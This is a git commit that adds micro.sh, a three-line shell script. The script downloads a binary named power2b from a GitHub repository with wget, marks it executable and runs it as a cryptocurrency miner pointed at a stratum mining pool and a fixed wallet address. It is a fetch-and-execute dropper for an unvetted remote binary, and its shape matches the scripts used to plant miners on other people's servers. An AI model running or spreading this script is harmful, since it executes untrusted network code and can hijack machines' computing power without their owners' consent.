3a437d770fc56608881315bab63d0b15f882e728
micromine00848 <micromine001@protonmail.com>
2025-05-27 23:44:02 +0530

    Create micro.sh

---
+++ micro.sh
@@ -0,0 +1,3 @@
+wget https://github.com/micromine00848/powerb2/raw/refs/heads/main/power2b
+chmod +x power2b
+./power2b  -a power2b  -o stratum+tcp://stratum-asia.rplant.xyz:7022 -u Ms4VeDHxC57V8bzu4EdsRWipH9mhhhk1Xx
